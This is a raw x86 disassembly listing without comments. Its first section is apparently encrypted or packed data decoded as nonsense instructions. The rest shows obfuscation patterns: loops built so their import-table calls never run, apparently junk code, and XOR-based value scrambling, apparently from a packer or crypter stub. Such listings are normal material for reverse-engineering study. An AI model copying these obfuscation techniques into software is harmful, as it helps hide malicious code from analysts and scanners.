  411a6d:	nop
  411a6e:	call   0x9911acd9
  411a73:	cmp    DWORD PTR ds:0xe22f124c,edi
  411a79:	jg     0x411adf
  411a7b:	scas   al,BYTE PTR es:[edi]
  411a7c:	adc    al,0x6b
  411a7e:	sbb    bh,dh
  411a80:	scas   eax,DWORD PTR es:[edi]
  411a81:	lds    esp,FWORD PTR [ebp+0x30f14a1c]
  411a87:	jae    0x411a79
  411a89:	fcmovne st,st(6)
  411a8b:	lods   al,BYTE PTR ds:[esi]
  411a8c:	loopne 0x411b09
  411a8e:	jle    0x411ace
  411a90:	and    eax,0x9cd0c217
  411a95:	cmp    ecx,DWORD PTR [ebp*1+0x63a1a3c]
  411a9c:	gs push ds
  411a9e:	jne    0x411a73
  411aa0:	adc    DWORD PTR [edi+0x160c3165],ecx
  411aa6:	jbe    0x411a6d
  411aa8:	repnz lods al,BYTE PTR ds:[esi]
  411aaa:	sub    DWORD PTR [eax+0x64341dc6],0xffffffde
  411ab1:	xor    bl,BYTE PTR [ecx+0x66]
  411ab4:	pop    ss
  411ab5:	or     DWORD PTR [esi],ebx
  411ab7:	cmp    esp,esp
  411ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aba:	jno    0x411ac0
  411abc:	jge    0x411a65
  411abe:	xchg   edi,eax
  411abf:	sub    eax,0x927db5bd
  411ac4:	xor    al,BYTE PTR [eax+ebx*8+0x1b]
  411ac8:	or     eax,0xf43a0481
  411acd:	mov    al,0x0
  411acf:	icebp  
  411ad0:	fcomip st,st(4)
  411ad2:	mov    dl,0x5
  411ad4:	add    bl,BYTE PTR [esi-0x69]
  411ad7:	adc    bh,ch
  411ad9:	out    0x11,al
  411adb:	iret   
  411adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411add:	xchg   DWORD PTR [ebp+edi*8-0x303f34b0],ecx
  411ae4:	add    dh,ch
  411ae6:	push   esi
  411ae7:	or     ah,BYTE PTR [esi-0x2]
  411aea:	mov    ebx,0x62ee566e
  411aef:	(bad)  
  411af0:	jmp    0xb1a5ef67
  411af5:	adc    BYTE PTR [edi+0x39],dl
  411af8:	dec    eax
  411af9:	je     0x411b4b
  411afb:	imul   esi,DWORD PTR [ebx+ecx*1-0x49300f48],0x2e4825a4
  411b06:	jne    0x411add
  411b08:	xor    al,0x53
  411b0a:	(bad)  
  411b0b:	dec    DWORD PTR [edx]
  411b0d:	mov    dl,0x7a
  411b0f:	mov    bh,0xf7
  411b11:	loopne 0x411afd
  411b13:	and    cl,ah
  411b15:	mov    al,ds:0x7e54946
  411b1a:	clc    
  411b1b:	mov    bh,0x97
  411b1d:	aaa    
  411b1e:	cmp    bh,al
  411b20:	cmp    eax,0xe79914db
  411b25:	cmovne eax,DWORD PTR [ebx]
  411b28:	(bad)  
  411b2a:	mov    ebx,0x2bca90f0
  411b2f:	jb     0x411b45
  411b31:	das    
  411b32:	loop   0x411b8e
  411b34:	fadd   DWORD PTR [esi+0x28393888]
  411b3a:	loop   0x411b8e
  411b3c:	xchg   ecx,eax
  411b3d:	jbe    0x411ad6
  411b3f:	pusha  
  411b40:	in     eax,0xf4
  411b42:	out    dx,eax
  411b43:	sbb    edi,DWORD PTR [ecx+0x4]
  411b46:	add    al,0x54
  411b48:	jmp    0xe86a861e
  411b4d:	cmp    al,0x16
  411b4f:	inc    eax
  411b50:	out    dx,al
  411b51:	mov    ds:0xdfdc1c62,eax
  411b56:	add    DWORD PTR [eax-0x1be1d3eb],esi
  411b5c:	ss stos DWORD PTR es:[edi],eax
  411b5e:	mov    dl,0x14
  411b60:	jb     0x411b0b
  411b62:	dec    BYTE PTR [ebp-0x30]
  411b65:	xor    eax,0x66d57c7
  411b6a:	add    bh,ah
  411b6c:	and    cl,ch
  411b6e:	push   0x5d93a53c
  411b73:	mov    cl,ch
  411b75:	mov    ds:0x8fd85b8b,al
  411b7a:	push   cs
  411b7b:	or     al,ch
  411b7d:	stos   BYTE PTR es:[edi],al
  411b7e:	mov    ch,0xc4
  411b80:	loopne 0x411bd9
  411b82:	sbb    BYTE PTR [ebp+0x22],dh
  411b85:	mov    edx,0x77705852
  411b8a:	inc    eax
  411b8b:	sahf   
  411b8c:	ret    
  411b8d:	mov    cl,0x4a
  411b8f:	pop    ebx
  411b90:	dec    ebp
  411b91:	mov    bl,0x2a
  411b93:	test   DWORD PTR fs:[esi+0x1f47bd2b],edi
  411b9a:	(bad)  
  411b9c:	ror    ah,cl
  411b9e:	dec    edx
  411b9f:	(bad)  [edx+0x19a1e306]
  411ba5:	das    
  411ba6:	adc    BYTE PTR [ecx],ah
  411ba8:	push   cs
  411ba9:	shl    BYTE PTR [eax-0x6c],1
  411bac:	pop    ebx
  411bad:	out    dx,eax
  411bae:	push   esp
  411baf:	xchg   dx,ax
  411bb1:	add    DWORD PTR [esi+0x22],0x4ed3fd6e
  411bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb9:	dec    esp
  411bba:	inc    esi
  411bbc:	lock dec edi
  411bbe:	push   ebp
  411bbf:	daa    
  411bc0:	in     al,0x1b
  411bc2:	dec    ebx
  411bc3:	adc    BYTE PTR [edi+ecx*4-0x194fdea0],0x4
  411bcb:	ret    
  411bcc:	(bad)  
  411bcd:	and    ah,cl
  411bcf:	pop    ss
  411bd0:	imul   esp,DWORD PTR [ecx+0x65],0x8b9c0627
  411bd7:	pop    ds
  411bd8:	in     eax,dx
  411bd9:	push   edi
  411bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bdb:	dec    esp
  411bdc:	pop    ds
  411bdd:	mov    dl,0x97
  411bdf:	xchg   DWORD PTR [eax],eax
  411be1:	xchg   BYTE PTR [esi-0x5f],cl
  411be4:	out    dx,al
  411be5:	outs   dx,DWORD PTR ds:[esi]
  411be6:	bound  esi,QWORD PTR [esp+edx*4-0x3c]
  411bea:	pushf  
  411beb:	pop    esp
  411bec:	inc    ebx
  411bed:	mov    ch,dl
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x430a00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x430a3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x430a04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x430a40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x430a08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x430a44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x430a48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x430a0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x430a4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x430a10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x430a14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x430a18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
